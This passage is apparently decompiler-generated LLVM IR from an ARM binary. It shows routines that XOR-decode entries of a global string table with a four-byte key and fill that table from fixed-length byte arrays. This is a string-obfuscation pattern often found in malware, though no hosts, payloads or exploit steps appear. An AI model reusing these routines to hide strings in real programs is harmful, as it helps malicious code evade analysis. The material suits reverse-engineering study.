  uselistorder i32* @r8, { 15, 16, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 56, 53, 54, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 81, 82, 80, 83, 84, 85, 86, 87, 88, 89 }
  uselistorder i32* @r7, { 25, 26, 24, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 1, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69 }
  uselistorder i32* @r5, { 151, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0, 30, 31, 32, 33, 34, 35, 7, 36, 37, 38, 39, 40, 41, 42, 43, 8, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 152, 153, 154, 155, 156, 157, 158, 159, 161, 162, 160, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 4, 200, 201, 202, 203, 204, 205, 206, 6, 207, 208, 1, 209, 210, 2, 211, 212, 3, 213, 214, 215, 216, 217, 218, 9, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 5, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261 }
}

define i32 @function_13000(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_13000:
  store i32 ptrtoint (i32* @global_var_1cdd4.391 to i32), i32* @ip, align 4
  %v3_13004 = mul i32 %arg1, 8
  %v2_13008 = add i32 %v3_13004, ptrtoint (i32* @global_var_1cdd4.391 to i32)
  %v2_1300c = icmp eq i32* %arg2, null
  br i1 %v2_1300c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_13000
  %v3_1301811 = inttoptr i32 %v2_13008 to i32*
  %v4_1301812 = load i32, i32* %v3_1301811, align 4
  br label %bb15

bb:                                               ; preds = %dec_label_pc_13000
  %v2_13010 = add i32 %v3_13004, add (i32 ptrtoint (i32* @global_var_1cdd4.391 to i32), i32 5)
  %v3_13010 = inttoptr i32 %v2_13010 to i8*
  %v4_13010 = load i8, i8* %v3_13010, align 1
  %v5_13010 = zext i8 %v4_13010 to i32
  %v2_13014 = add i32 %v3_13004, add (i32 ptrtoint (i32* @global_var_1cdd4.391 to i32), i32 4)
  %v3_13014 = inttoptr i32 %v2_13014 to i8*
  %v4_13014 = load i8, i8* %v3_13014, align 4
  %v5_13014 = zext i8 %v4_13014 to i32
  %v3_13018 = inttoptr i32 %v2_13008 to i32*
  %v4_13018 = load i32, i32* %v3_13018, align 4
  %v5_1301c = mul nuw nsw i32 %v5_13010, 256
  %v6_1301c = or i32 %v5_13014, %v5_1301c
  store i32 %v6_1301c, i32* %arg2, align 4
  br label %bb15

bb15:                                             ; preds = %.thread, %bb
  %v4_13018714 = phi i32 [ %v4_1301812, %.thread ], [ %v4_13018, %bb ]
  ret i32 %v4_13018714

; uselistorder directives
  uselistorder i32 %v2_13008, { 1, 0 }
  uselistorder i32 %v3_13004, { 2, 1, 0 }
  uselistorder i32* null, { 2, 3, 6, 7, 8, 9, 1, 10, 11, 12, 0, 13, 5, 14, 15, 16, 23, 17, 18, 19, 20, 21, 22, 4, 24 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_1302c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1302c:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1302c = mul i32 %arg1, 8
  %v3_13030 = load i32, i32* @r4, align 4
  store i32 %v3_13030, i32* %stack_var_-20, align 4
  %v3_13040 = and i32 %v3_1302c, 2040
  %v2_13044 = add i32 %v3_13040, ptrtoint (i32* @global_var_1cdd4.391 to i32)
  store i32 %v2_13044, i32* %lr.global-to-local, align 4
  %v1_1304c = add i32 %v3_13040, add (i32 ptrtoint (i32* @global_var_1cdd4.391 to i32), i32 4)
  store i32 %v1_1304c, i32* %r7.global-to-local, align 4
  %v2_13050 = load i32, i32* @global_var_1cd10.394, align 4
  %v2_13054 = inttoptr i32 %v1_1304c to i8*
  %v3_13054 = load i8, i8* %v2_13054, align 4
  %v4_13054 = zext i8 %v3_13054 to i32
  store i32 %v4_13054, i32* @r1, align 4
  %v1_13058 = add i32 %v3_13040, add (i32 ptrtoint (i32* @global_var_1cdd4.391 to i32), i32 5)
  %v2_13058 = inttoptr i32 %v1_13058 to i8*
  %v3_13058 = load i8, i8* %v2_13058, align 1
  %v4_13058 = zext i8 %v3_13058 to i32
  %v3_1305c = udiv i32 %v2_13050, 256
  %v4_13060 = mul nuw nsw i32 %v4_13058, 256
  %v5_13060 = or i32 %v4_13060, %v4_13054
  %v7_13060 = icmp eq i32 %v5_13060, 0
  store i1 %v7_13060, i1* @cpsr_z, align 1
  %v3_13064 = udiv i32 %v2_13050, 65536
  %v1_13068 = urem i32 %v3_1305c, 256
  store i32 %v1_13068, i32* %r6.global-to-local, align 4
  %v1_1306c = urem i32 %v3_13064, 256
  store i32 %v1_1306c, i32* %r5.global-to-local, align 4
  %v3_13070 = udiv i32 %v2_13050, 16777216
  store i32 %v3_13070, i32* %r4.global-to-local, align 4
  %v1_13074 = urem i32 %v2_13050, 256
  br i1 %v7_13060, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_1302c
  store i32 %v3_13030, i32* @r4, align 4
  ret i32 %v1_13074

bb8:                                              ; preds = %dec_label_pc_1302c
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_13080

dec_label_pc_13080:                               ; preds = %dec_label_pc_13080, %bb8
  %v2_1308c = phi i32 [ %v1_130c8, %dec_label_pc_13080 ], [ 0, %bb8 ]
  %v0_13080 = phi i32 [ %v0_130c0, %dec_label_pc_13080 ], [ %v2_13044, %bb8 ]
  %v1_13080 = inttoptr i32 %v0_13080 to i32*
  %v2_13080 = load i32, i32* %v1_13080, align 4
  %v2_13084 = add i32 %v2_13080, %v2_1308c
  %v3_13084 = inttoptr i32 %v2_13084 to i8*
  %v4_13084 = load i8, i8* %v3_13084, align 1
  %v6_13084 = zext i8 %v4_13084 to i32
  %v2_13088 = xor i32 %v6_13084, %v1_13074
  %v1_1308c = trunc i32 %v2_13088 to i8
  store i8 %v1_1308c, i8* %v3_13084, align 1
  %v0_13090 = load i32, i32* %lr.global-to-local, align 4
  %v1_13090 = inttoptr i32 %v0_13090 to i32*
  %v2_13090 = load i32, i32* %v1_13090, align 4
  %v0_13094 = load i32, i32* @ip, align 4
  %v2_13094 = add i32 %v0_13094, %v2_13090
  %v3_13094 = inttoptr i32 %v2_13094 to i8*
  %v4_13094 = load i8, i8* %v3_13094, align 1
  %v6_13094 = zext i8 %v4_13094 to i32
  %v0_13098 = load i32, i32* %r6.global-to-local, align 4
  %v2_13098 = xor i32 %v0_13098, %v6_13094
  %v1_1309c = trunc i32 %v2_13098 to i8
  store i8 %v1_1309c, i8* %v3_13094, align 1
  %v0_130a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_130a0 = inttoptr i32 %v0_130a0 to i32*
  %v2_130a0 = load i32, i32* %v1_130a0, align 4
  %v0_130a4 = load i32, i32* @ip, align 4
  %v2_130a4 = add i32 %v0_130a4, %v2_130a0
  %v3_130a4 = inttoptr i32 %v2_130a4 to i8*
  %v4_130a4 = load i8, i8* %v3_130a4, align 1
  %v6_130a4 = zext i8 %v4_130a4 to i32
  %v0_130a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_130a8 = xor i32 %v0_130a8, %v6_130a4
  %v1_130ac = trunc i32 %v2_130a8 to i8
  store i8 %v1_130ac, i8* %v3_130a4, align 1
  %v0_130b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_130b0 = inttoptr i32 %v0_130b0 to i32*
  %v2_130b0 = load i32, i32* %v1_130b0, align 4
  store i32 %v2_130b0, i32* @r1, align 4
  %v0_130b4 = load i32, i32* @ip, align 4
  %v2_130b4 = add i32 %v0_130b4, %v2_130b0
  %v3_130b4 = inttoptr i32 %v2_130b4 to i8*
  %v4_130b4 = load i8, i8* %v3_130b4, align 1
  %v6_130b4 = zext i8 %v4_130b4 to i32
  %v0_130b8 = load i32, i32* %r4.global-to-local, align 4
  %v2_130b8 = xor i32 %v0_130b8, %v6_130b4
  %v1_130bc = trunc i32 %v2_130b8 to i8
  store i8 %v1_130bc, i8* %v3_130b4, align 1
  %v0_130c0 = load i32, i32* %lr.global-to-local, align 4
  %v1_130c0 = add i32 %v0_130c0, 4
  %v2_130c0 = inttoptr i32 %v1_130c0 to i8*
  %v3_130c0 = load i8, i8* %v2_130c0, align 1
  %v4_130c0 = zext i8 %v3_130c0 to i32
  %v0_130c4 = load i32, i32* %r7.global-to-local, align 4
  %v1_130c4 = add i32 %v0_130c4, 1
  %v2_130c4 = inttoptr i32 %v1_130c4 to i8*
  %v3_130c4 = load i8, i8* %v2_130c4, align 1
  %v4_130c4 = zext i8 %v3_130c4 to i32
  %v0_130c8 = load i32, i32* @ip, align 4
  %v1_130c8 = add i32 %v0_130c8, 1
  store i32 %v1_130c8, i32* @ip, align 4
  %v4_130cc = mul nuw nsw i32 %v4_130c4, 256
  %v5_130cc = or i32 %v4_130cc, %v4_130c0
  %v9_130d0 = icmp eq i32 %v5_130cc, %v1_130c8
  store i1 %v9_130d0, i1* @cpsr_z, align 1
  %v8_130d4 = icmp sgt i32 %v5_130cc, %v1_130c8
  br i1 %v8_130d4, label %dec_label_pc_13080, label %dec_label_pc_130d8

dec_label_pc_130d8:                               ; preds = %dec_label_pc_13080
  %v2_130d8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_130d8, i32* @r4, align 4
  ret i32 %v1_13074

; uselistorder directives
  uselistorder i32 %v1_130c8, { 1, 2, 3, 0 }
  uselistorder i32 %v0_130c0, { 1, 0 }
  uselistorder i32 %v1_13074, { 0, 2, 1 }
  uselistorder i32 %v2_13050, { 3, 0, 1, 2 }
  uselistorder i32* @ip, { 5, 6, 7, 8, 9, 10, 11, 0, 1, 2, 3, 4, 12, 13, 14, 15 }
}

define i32 @function_130e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_130e4:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_130e4 = mul i32 %arg1, 8
  %v3_130e8 = load i32, i32* @r4, align 4
  store i32 %v3_130e8, i32* %stack_var_-20, align 4
  %v3_130f8 = and i32 %v3_130e4, 2040
  %v2_130fc = add i32 %v3_130f8, ptrtoint (i32* @global_var_1cdd4.391 to i32)
  store i32 %v2_130fc, i32* %lr.global-to-local, align 4
  %v1_13104 = add i32 %v3_130f8, add (i32 ptrtoint (i32* @global_var_1cdd4.391 to i32), i32 4)
  store i32 %v1_13104, i32* %r7.global-to-local, align 4
  %v2_13108 = load i32, i32* @global_var_1cd10.394, align 4
  %v2_1310c = inttoptr i32 %v1_13104 to i8*
  %v3_1310c = load i8, i8* %v2_1310c, align 4
  %v4_1310c = zext i8 %v3_1310c to i32
  %v1_13110 = add i32 %v3_130f8, add (i32 ptrtoint (i32* @global_var_1cdd4.391 to i32), i32 5)
  %v2_13110 = inttoptr i32 %v1_13110 to i8*
  %v3_13110 = load i8, i8* %v2_13110, align 1
  %v4_13110 = zext i8 %v3_13110 to i32
  %v3_13114 = udiv i32 %v2_13108, 256
  %v4_13118 = mul nuw nsw i32 %v4_13110, 256
  %v5_13118 = or i32 %v4_13118, %v4_1310c
  %v7_13118 = icmp eq i32 %v5_13118, 0
  %v3_1311c = udiv i32 %v2_13108, 65536
  %v1_13120 = urem i32 %v3_13114, 256
  store i32 %v1_13120, i32* %r6.global-to-local, align 4
  %v1_13124 = urem i32 %v3_1311c, 256
  store i32 %v1_13124, i32* %r5.global-to-local, align 4
  %v3_13128 = udiv i32 %v2_13108, 16777216
  store i32 %v3_13128, i32* %r4.global-to-local, align 4
  %v1_1312c = urem i32 %v2_13108, 256
  br i1 %v7_13118, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_130e4
  store i32 %v3_130e8, i32* @r4, align 4
  ret i32 %v1_1312c

bb8:                                              ; preds = %dec_label_pc_130e4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13138

dec_label_pc_13138:                               ; preds = %dec_label_pc_13138, %bb8
  %v2_13144 = phi i32 [ %v1_13180, %dec_label_pc_13138 ], [ 0, %bb8 ]
  %v0_13138 = phi i32 [ %v0_13178, %dec_label_pc_13138 ], [ %v2_130fc, %bb8 ]
  %v1_13138 = inttoptr i32 %v0_13138 to i32*
  %v2_13138 = load i32, i32* %v1_13138, align 4
  %v2_1313c = add i32 %v2_13138, %v2_13144
  %v3_1313c = inttoptr i32 %v2_1313c to i8*
  %v4_1313c = load i8, i8* %v3_1313c, align 1
  %v6_1313c = zext i8 %v4_1313c to i32
  %v2_13140 = xor i32 %v6_1313c, %v1_1312c
  %v1_13144 = trunc i32 %v2_13140 to i8
  store i8 %v1_13144, i8* %v3_1313c, align 1
  %v0_13148 = load i32, i32* %lr.global-to-local, align 4
  %v1_13148 = inttoptr i32 %v0_13148 to i32*
  %v2_13148 = load i32, i32* %v1_13148, align 4
  %v0_1314c = load i32, i32* %ip.global-to-local, align 4
  %v2_1314c = add i32 %v0_1314c, %v2_13148
  %v3_1314c = inttoptr i32 %v2_1314c to i8*
  %v4_1314c = load i8, i8* %v3_1314c, align 1
  %v6_1314c = zext i8 %v4_1314c to i32
  %v0_13150 = load i32, i32* %r6.global-to-local, align 4
  %v2_13150 = xor i32 %v0_13150, %v6_1314c
  %v1_13154 = trunc i32 %v2_13150 to i8
  store i8 %v1_13154, i8* %v3_1314c, align 1
  %v0_13158 = load i32, i32* %lr.global-to-local, align 4
  %v1_13158 = inttoptr i32 %v0_13158 to i32*
  %v2_13158 = load i32, i32* %v1_13158, align 4
  %v0_1315c = load i32, i32* %ip.global-to-local, align 4
  %v2_1315c = add i32 %v0_1315c, %v2_13158
  %v3_1315c = inttoptr i32 %v2_1315c to i8*
  %v4_1315c = load i8, i8* %v3_1315c, align 1
  %v6_1315c = zext i8 %v4_1315c to i32
  %v0_13160 = load i32, i32* %r5.global-to-local, align 4
  %v2_13160 = xor i32 %v0_13160, %v6_1315c
  %v1_13164 = trunc i32 %v2_13160 to i8
  store i8 %v1_13164, i8* %v3_1315c, align 1
  %v0_13168 = load i32, i32* %lr.global-to-local, align 4
  %v1_13168 = inttoptr i32 %v0_13168 to i32*
  %v2_13168 = load i32, i32* %v1_13168, align 4
  %v0_1316c = load i32, i32* %ip.global-to-local, align 4
  %v2_1316c = add i32 %v0_1316c, %v2_13168
  %v3_1316c = inttoptr i32 %v2_1316c to i8*
  %v4_1316c = load i8, i8* %v3_1316c, align 1
  %v6_1316c = zext i8 %v4_1316c to i32
  %v0_13170 = load i32, i32* %r4.global-to-local, align 4
  %v2_13170 = xor i32 %v0_13170, %v6_1316c
  %v1_13174 = trunc i32 %v2_13170 to i8
  store i8 %v1_13174, i8* %v3_1316c, align 1
  %v0_13178 = load i32, i32* %lr.global-to-local, align 4
  %v1_13178 = add i32 %v0_13178, 4
  %v2_13178 = inttoptr i32 %v1_13178 to i8*
  %v3_13178 = load i8, i8* %v2_13178, align 1
  %v4_13178 = zext i8 %v3_13178 to i32
  %v0_1317c = load i32, i32* %r7.global-to-local, align 4
  %v1_1317c = add i32 %v0_1317c, 1
  %v2_1317c = inttoptr i32 %v1_1317c to i8*
  %v3_1317c = load i8, i8* %v2_1317c, align 1
  %v4_1317c = zext i8 %v3_1317c to i32
  %v0_13180 = load i32, i32* %ip.global-to-local, align 4
  %v1_13180 = add i32 %v0_13180, 1
  store i32 %v1_13180, i32* %ip.global-to-local, align 4
  %v4_13184 = mul nuw nsw i32 %v4_1317c, 256
  %v5_13184 = or i32 %v4_13184, %v4_13178
  %v8_1318c = icmp sgt i32 %v5_13184, %v1_13180
  br i1 %v8_1318c, label %dec_label_pc_13138, label %dec_label_pc_13190

dec_label_pc_13190:                               ; preds = %dec_label_pc_13138
  %v2_13190 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13190, i32* @r4, align 4
  ret i32 %v1_1312c

; uselistorder directives
  uselistorder i32 %v1_13180, { 1, 2, 0 }
  uselistorder i32 %v0_13178, { 1, 0 }
  uselistorder i32 %v1_1312c, { 1, 2, 0 }
  uselistorder i32 %v2_13108, { 3, 0, 1, 2 }
  uselistorder i32 16777216, { 1, 2, 0, 4, 3, 6, 5, 7, 8, 10, 9, 11, 13, 14, 12, 15 }
}

define i32 @function_1319c() local_unnamed_addr {
dec_label_pc_1319c:
  %fp.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1319c = load i32, i32* @r4, align 4
  store i32 %v3_1319c, i32* %stack_var_-36, align 4
  %v1_131a4 = call i32 @_malloc(i32 12)
  store i32 ptrtoint ([13 x i8]* @global_var_14618.398 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cdd4.391 to i32), i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 12, i32* %r8.global-to-local, align 4
  store i32 %v1_131a4, i32* %r5.global-to-local, align 4
  %v4_131c4 = call i32 @function_13a84(i32 %v1_131a4, i32 ptrtoint ([13 x i8]* @global_var_14618.398 to i32), i32 12)
  %v0_131cc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_131cc, i32* @global_var_1cdec.400, align 4
  store i8 12, i8* bitcast (i32* @global_var_1cdf0.401 to i8*), align 4
  %v0_131d4 = load i32, i32* %r6.global-to-local, align 4
  %v1_131d4 = trunc i32 %v0_131d4 to i8
  store i8 %v1_131d4, i8* bitcast (i32* @global_var_1cdf1.402 to i8*), align 4
  %v1_131d8 = call i32 @_malloc(i32 2)
  store i32 2, i32* %r5.global-to-local, align 4
  store i32 %v1_131d8, i32* %r7.global-to-local, align 4
  %v3_131ec = call i32 @function_13a84(i32 %v1_131d8, i32 ptrtoint (i32* @global_var_14628.404 to i32), i32 2)
  %v0_131f0 = load i32, i32* %r8.global-to-local, align 4
  %v0_131f4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_131f4, i32* @global_var_1cdf4.405, align 4
  %v0_131f8 = load i32, i32* %r5.global-to-local, align 4
  %v1_131f8 = trunc i32 %v0_131f8 to i8
  store i8 %v1_131f8, i8* bitcast (i32* @global_var_1cdf8.406 to i8*), align 4
  %v0_131fc = load i32, i32* %r6.global-to-local, align 4
  %v1_131fc = trunc i32 %v0_131fc to i8
  store i8 %v1_131fc, i8* bitcast (i32* @global_var_1cdf9.407 to i8*), align 4
  %v1_13200 = call i32 @_malloc(i32 %v0_131f0)
  %v0_13204 = load i32, i32* %sl.global-to-local, align 4
  %v0_13208 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_13200, i32* %r7.global-to-local, align 4
  %v4_13210 = call i32 @function_13a84(i32 %v1_13200, i32 %v0_13204, i32 %v0_13208)
  %v0_13214 = load i32, i32* %r5.global-to-local, align 4
  %v0_13218 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_13218, i32* @global_var_1ce64.408, align 4
  %v1_1321c = trunc i32 %v0_13208 to i8
  store i8 %v1_1321c, i8* bitcast (i32* @global_var_1ce68.409 to i8*), align 4
  %v0_13220 = load i32, i32* %r6.global-to-local, align 4
  %v1_13220 = trunc i32 %v0_13220 to i8
  store i8 %v1_13220, i8* bitcast (i32* @global_var_1ce69.410 to i8*), align 4
  %v1_13224 = call i32 @_malloc(i32 %v0_13214)
  %v0_13228 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_13224, i32* %r7.global-to-local, align 4
  %v3_13234 = call i32 @function_13a84(i32 %v1_13224, i32 ptrtoint (i32* @global_var_1462c.412 to i32), i32 %v0_13228)
  %v0_1323c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1323c, i32* @global_var_1ce6c.413, align 4
  %v0_13240 = load i32, i32* %r5.global-to-local, align 4
  %v1_13240 = trunc i32 %v0_13240 to i8
  store i8 %v1_13240, i8* bitcast (i32* @global_var_1ce70.414 to i8*), align 4
  %v0_13244 = load i32, i32* %r6.global-to-local, align 4
  %v1_13244 = trunc i32 %v0_13244 to i8
  store i8 %v1_13244, i8* bitcast (i32* @global_var_1ce71.415 to i8*), align 4
  %v1_13248 = call i32 @_malloc(i32 15)
  store i32 %v1_13248, i32* %r5.global-to-local, align 4
  %v3_13258 = call i32 @function_13a84(i32 %v1_13248, i32 ptrtoint (i32* @global_var_14630.417 to i32), i32 15)
  store i32 15, i32* %r3.global-to-local, align 4
  store i8 15, i8* bitcast (i32* @global_var_1cde8.418 to i8*), align 4
  %v0_13268 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13268, i32* @global_var_1cde4.419, align 4
  %v0_1326c = load i32, i32* %r6.global-to-local, align 4
  %v1_1326c = trunc i32 %v0_1326c to i8
  store i8 %v1_1326c, i8* bitcast (i32* @global_var_1cde9.420 to i8*), align 4
  %v1_13270 = call i32 @_malloc(i32 29)
  store i32 %v1_13270, i32* %r5.global-to-local, align 4
  %v3_13280 = call i32 @function_13a84(i32 %v1_13270, i32 ptrtoint (i32* @global_var_14640.422 to i32), i32 29)
  store i32 29, i32* %r3.global-to-local, align 4
  store i8 29, i8* bitcast (i32* @global_var_1ce00.423 to i8*), align 4
  %v0_13290 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13290, i32* @global_var_1cdfc.424, align 4
  %v0_13294 = load i32, i32* %r6.global-to-local, align 4
  %v1_13294 = trunc i32 %v0_13294 to i8
  store i8 %v1_13294, i8* bitcast (i32* @global_var_1ce01.425 to i8*), align 4
  %v1_13298 = call i32 @_malloc(i32 7)
  store i32 7, i32* %r7.global-to-local, align 4
  store i32 %v1_13298, i32* %r5.global-to-local, align 4
  %v4_132ac = call i32 @function_13a84(i32 %v1_13298, i32 ptrtoint ([8 x i8]* @global_var_14660.427 to i32), i32 7)
  %v0_132b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_132b4, i32* @global_var_1ce04.428, align 4
  %v0_132b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_132b8 = trunc i32 %v0_132b8 to i8
  store i8 %v1_132b8, i8* bitcast (i32* @global_var_1ce08.429 to i8*), align 4
  %v0_132bc = load i32, i32* %r6.global-to-local, align 4
  %v1_132bc = trunc i32 %v0_132bc to i8
  store i8 %v1_132bc, i8* bitcast (i32* @global_var_1ce09.430 to i8*), align 4
  %v1_132c0 = call i32 @_malloc(i32 5)
  store i32 %v1_132c0, i32* %r5.global-to-local, align 4
  %v4_132d0 = call i32 @function_13a84(i32 %v1_132c0, i32 ptrtoint ([6 x i8]* @global_var_14668.432 to i32), i32 5)
  store i32 5, i32* %r3.global-to-local, align 4
  store i8 5, i8* bitcast (i32* @global_var_1ce10.433 to i8*), align 4
  %v0_132e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_132e0, i32* @global_var_1ce0c.434, align 4
  %v0_132e4 = load i32, i32* %r6.global-to-local, align 4
  %v1_132e4 = trunc i32 %v0_132e4 to i8
  store i8 %v1_132e4, i8* bitcast (i32* @global_var_1ce11.435 to i8*), align 4
  %v1_132e8 = call i32 @_malloc(i32 11)
  store i32 %v1_132e8, i32* %r5.global-to-local, align 4
  %v3_132f8 = call i32 @function_13a84(i32 %v1_132e8, i32 ptrtoint (i32* @global_var_14670.437 to i32), i32 11)
  store i32 11, i32* %r3.global-to-local, align 4
  store i8 11, i8* bitcast (i32* @global_var_1ce18.438 to i8*), align 4
  %v0_13308 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13308, i32* @global_var_1ce14.439, align 4
  %v0_1330c = load i32, i32* %r6.global-to-local, align 4
  %v1_1330c = trunc i32 %v0_1330c to i8
  store i8 %v1_1330c, i8* bitcast (i32* @global_var_1ce19.440 to i8*), align 4
  %v1_13310 = call i32 @_malloc(i32 4)
  store i32 %v1_13310, i32* %r5.global-to-local, align 4
  %v4_13320 = call i32 @function_13a84(i32 %v1_13310, i32 ptrtoint ([5 x i8]* @global_var_1467c.442 to i32), i32 4)
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_13328 = load i32, i32* %r7.global-to-local, align 4
  store i8 4, i8* bitcast (i32* @global_var_1ce20.443 to i8*), align 4
  %v0_13330 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13330, i32* @global_var_1ce1c.444, align 4
  %v0_13334 = load i32, i32* %r6.global-to-local, align 4
  %v1_13334 = trunc i32 %v0_13334 to i8
  store i8 %v1_13334, i8* bitcast (i32* @global_var_1ce21.445 to i8*), align 4
  %v1_13338 = call i32 @_malloc(i32 %v0_13328)
  %v0_1333c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_13338, i32* %r5.global-to-local, align 4
  %v4_13348 = call i32 @function_13a84(i32 %v1_13338, i32 ptrtoint ([8 x i8]* @global_var_14684.447 to i32), i32 %v0_1333c)
  %v0_13350 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13350, i32* @global_var_1ce24.448, align 4
  %v0_13354 = load i32, i32* %r7.global-to-local, align 4
  %v1_13354 = trunc i32 %v0_13354 to i8
  store i8 %v1_13354, i8* bitcast (i32* @global_var_1ce28.449 to i8*), align 4
  %v0_13358 = load i32, i32* %r6.global-to-local, align 4
  %v1_13358 = trunc i32 %v0_13358 to i8
  store i8 %v1_13358, i8* bitcast (i32* @global_var_1ce29.450 to i8*), align 4
  %v1_1335c = call i32 @_malloc(i32 8)
  store i32 %v1_1335c, i32* %r5.global-to-local, align 4
  %v4_1336c = call i32 @function_13a84(i32 %v1_1335c, i32 ptrtoint ([9 x i8]* @global_var_1468c.452 to i32), i32 8)
  store i32 8, i32* %r3.global-to-local, align 4
  store i8 8, i8* bitcast (i32* @global_var_1ce30.453 to i8*), align 4
  %v0_1337c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1337c, i32* @global_var_1ce2c.454, align 4
  %v0_13380 = load i32, i32* %r6.global-to-local, align 4
  %v1_13380 = trunc i32 %v0_13380 to i8
  store i8 %v1_13380, i8* bitcast (i32* @global_var_1ce31.455 to i8*), align 4
  %v1_13384 = call i32 @_malloc(i32 13)
  store i32 %v1_13384, i32* %r5.global-to-local, align 4
  %v3_13394 = call i32 @function_13a84(i32 %v1_13384, i32 ptrtoint (i32* @global_var_14698.457 to i32), i32 13)
  store i32 13, i32* %r3.global-to-local, align 4
  store i8 13, i8* bitcast (i32* @global_var_1ce38.458 to i8*), align 4
  %v0_133a4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_133a4, i32* @global_var_1ce34.459, align 4
  %v0_133a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_133a8 = trunc i32 %v0_133a8 to i8
  store i8 %v1_133a8, i8* bitcast (i32* @global_var_1ce39.460 to i8*), align 4
  %v1_133ac = call i32 @_malloc(i32 10)
  store i32 10, i32* %sl.global-to-local, align 4
  store i32 %v1_133ac, i32* %r5.global-to-local, align 4
  %v4_133c0 = call i32 @function_13a84(i32 %v1_133ac, i32 ptrtoint ([11 x i8]* @global_var_146a8.462 to i32), i32 10)
  %v0_133c8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_133c8, i32* @global_var_1ce3c.463, align 4
  store i8 10, i8* bitcast (i32* @global_var_1ce40.464 to i8*), align 4
  %v0_133d0 = load i32, i32* %r6.global-to-local, align 4
  %v1_133d0 = trunc i32 %v0_133d0 to i8
  store i8 %v1_133d0, i8* bitcast (i32* @global_var_1ce41.465 to i8*), align 4
  %v1_133d4 = call i32 @_malloc(i32 10)
  %v0_133dc = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_133d4, i32* %r5.global-to-local, align 4
